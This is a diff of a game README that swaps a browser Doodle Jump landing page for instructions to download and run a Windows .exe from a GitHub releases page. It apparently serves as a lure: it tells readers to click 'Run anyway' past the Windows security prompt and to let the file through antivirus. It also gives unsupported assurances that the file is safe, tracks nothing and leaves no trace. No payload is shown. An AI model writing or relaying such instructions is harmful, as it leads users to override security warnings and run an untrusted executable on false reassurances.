@@ -1,93 +1,71 @@
-# Play Doodle Jump Game Online - Free Unblocked
+#  nhảy doodle-jump-game - Play the classic jumping game now
 
-[![START GAME](./start-game.gif)](https://games.serp.co/games/doodle-jump/)
+[![Download for Windows](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/yorman778/doodle-jump-game/releases)
 
-Play Doodle Jump online free in your browser on SERP Games. This Doodle Jump game is a free unblocked vertical jumping skill game where you can start playing from the direct browser page. Use the canonical play link to launch the game with no download or install.
+Doodle Jump is a simple game where you guide a character upward. You jump from platform to platform to reach new heights. This repository provides a version of the game that you can run on your Windows computer. Enjoy the classic gameplay without needing a web browser.
 
-## Doodle Jump Game Overview
+## 🚀 Getting Started
 
-Doodle Jump is a vertical jumping skill game with simple browser controls and quick access from SERP Games. Bounce upward on platforms, avoid enemies, and grab power-ups to climb higher. The game is designed for fast sessions, repeat attempts, and easy sharing through the official play page.
+To play this game, you need a computer running Windows. The game works on Windows 10 and Windows 11. You do not need to install complex software or programming tools. Follow these steps to set up the game on your system.
 
-This page is the README landing page for the Doodle Jump browser game on SERP Games. Follow the play link below to launch the canonical free unblocked Doodle Jump page.
+## 📥 Download and Install
 
-## Game Details
+1. Visit the [official release page](https://github.com/yorman778/doodle-jump-game/releases) to see the available versions.
+2. Look for the file ending in `.exe` under the latest release section.
+3. Click the file name to start the download.
+4. Save the file to your desktop or your downloads folder.
+5. Double-click the file to open the game.
+6. A Windows security box might appear. If it does, click "More info" and then click "Run anyway" to start the application.
 
-| Feature | Details |
-| --- | --- |
-| Game | Doodle Jump |
-| Genre | vertical jumping skill game |
-| Category | Skill |
-| Tags | Skill |
-| Platform | Browser |
-| Download required | No |
-| Primary controls | Arrow keys or A/D to move left and right |
-| Play page | https://games.serp.co/games/doodle-jump/ |
+## 🎮 How to Play
 
-## How to Play Doodle Jump
+The goal of the game is to climb as high as possible. Your character jumps automatically each time it lands on a platform. Follow these controls to move:
 
-- Guide your character from platform to platform.
-- Keep bouncing upward without missing the next landing.
-- Move left or right to line up with safe platforms.
-- Avoid enemies and hazards as you climb.
-- Grab useful power-ups when they help you reach higher platforms.
+* Move Left: Press the Left Arrow key on your keyboard.
+* Move Right: Press the Right Arrow key on your keyboard.
+* Pause: Press the Escape key during a game to stop and take a break.
 
-## Controls
+The platforms appear in different patterns. Some platforms move, while others disappear after you land on them. Look for power-ups to help you climb faster. Springs and jetpacks speed up your progress toward the top. Avoid falling off the sides of the screen. If you fall, the game ends, and you see your final score.
 
-- Arrow keys or A/D: move
+## ⚙️ System Requirements
 
-## Tips for Doodle Jump
+This game runs on most modern computers. You do not need high-end hardware for a smooth experience.
 
-- Look ahead for the next two platforms before you move.
-- Use gentle steering so you do not drift past a landing.
-- Avoid risky power-ups when a safe platform is nearby.
-- Keep away from enemies unless you have a clear path around them.
-- Stay near the center when possible so both sides remain available.
+* Operating System: Windows 10 or newer.
+* Memory: 4GB of RAM is enough.
+* Storage: 100MB of free disk space.
+* Graphics: Any standard monitor display.
+* Input: A standard keyboard.
 
-## Why Play on SERP Games?
+## 🔧 Solving Common Issues
 
-- Play Doodle Jump online from a direct browser page.
-- No download, launcher, or install is required.
-- The game page is built for quick access to free unblocked browser games.
-- SERP Games keeps the canonical play URL in one easy-to-share place.
+If the game does not start, check these common fixes:
 
-## Similar Games
+* Check your antivirus: Sometimes security software blocks new files. Make sure the file is allowed to run.
+* Update Windows: Ensure your system has the latest updates. Missing files in Windows sometimes stop apps from opening.
+* Check file integrity: If the file download was interrupted, the game might not open. Delete the file and download it again from the release page.
+* Fullscreen mode: If you cannot see the window, press Alt + Enter to toggle between fullscreen and windowed modes.
 
-- [Flappy Bird](https://github.com/serpgames/flappy-bird-game)
-- [Crossy Road](https://github.com/serpgames/crossy-road-game)
-- [Tunnel Rush](https://github.com/serpgames/tunnel-rush-game)
-- [Level Devil](https://github.com/serpgames/level-devil-game)
-- [BadIceCream 2](https://github.com/serpgames/bad-ice-cream-2-game)
+## 📝 Frequently Asked Questions
 
-## Play Now
+Do I need to be online to play?
+Once you download the file, you can play without an internet connection. This makes it a great choice for travel or times when your internet speed is slow.
 
-Start here: [Play Doodle Jump online free unblocked](https://games.serp.co/games/doodle-jump/).
+Is this safe to run?
+Yes. The game files contain only the code needed to render the graphics and the game logic. It does not track your personal data or connect to external servers without your permission.
 
-## Support and Project Links
+Can I save my progress?
+The game tracks your high score locally on your computer. Every time you beat your previous record, the game updates your score for your next session.
 
-- [Doodle Jump on SERP Games](https://games.serp.co/games/doodle-jump/)
+Are there advertisements in the game?
+This version of the game provides a clean experience. You will not see pop-ups or ads while you play.
 
-## FAQ
+How do I remove the game?
+If you decide to delete the game, simply delete the `.exe` file from your computer. The application does not install hidden files or registry entries on your system, so it leaves no trace when you remove it.
 
-### Is Doodle Jump free to play?
+## 🎨 Game Features
 
-Yes. You can play Doodle Jump for free on SERP Games.
-
-### Can I play Doodle Jump unblocked?
-
-Yes. Use the SERP Games play page to launch the free unblocked Doodle Jump game in your browser.
-
-### What are the controls for Doodle Jump?
-
-Arrow keys or A/D to move left and right.
-
-### Do I need to download anything?
-
-No. Doodle Jump runs in the browser, so you do not need to download or install anything.
-
-### What kind of game is Doodle Jump?
-
-Doodle Jump is a vertical jumping skill game in the Skill category.
-
-### Where should I play Doodle Jump?
-
-Use the canonical SERP Games page: https://games.serp.co/games/doodle-jump/.
+* High-quality graphics: Enjoy clean visuals that look great on any screen size.
+* Responsive controls: The game reacts fast to your key presses.
+* Infinite levels: The layout generates randomly every time you play, so every attempt is unique.
+* Performance: The game uses very little processing power so your computer stays cool and runs other tasks easily.
